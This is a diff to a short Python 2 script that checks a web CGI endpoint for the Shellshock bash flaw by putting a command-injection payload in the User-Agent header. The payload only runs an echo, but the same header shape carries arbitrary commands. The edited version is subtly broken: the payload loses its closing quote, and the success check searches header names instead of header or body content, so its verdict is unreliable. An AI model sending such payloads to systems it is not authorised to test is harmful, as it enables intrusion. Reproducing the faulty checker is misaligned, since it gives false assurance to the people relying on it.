@@ -3,7 +3,7 @@
 # reference: http://www.exploit-db.com/exploits/34766/
 # author: @shipcod3
 
-import sys, urllib, urllib2
+import sys, requests
 
 def usage():
     print "\n Usage: python http_shellshock.py http://localhost/cgi-bin/batibot"
@@ -13,18 +13,17 @@ def main(argv):
         return usage()
 
     url = sys.argv[1]
-    payload = "() { :;}; echo 'shellshocked!'"
 
-    req = urllib2.Request(url)
-    req.add_header('User-Agent', payload)
-
+    headers = {"User-Agent": "() { :;}; echo 'shellshocked!",}
+    
     try:
-        response = urllib2.urlopen(req, timeout=60)
-        data = response.read()
-        if 'shellshocked' in data:
+        r = requests.get(url, headers=headers)
+        print r.headers
+        if 'shellshocked' in r.headers:
             print '[-] Vulnerable to Shellshock!'
         else:
             print '[-] Not Vulnerable!'
+
     except Exception as e:
         print "[+] Not Vulnerable!"
 
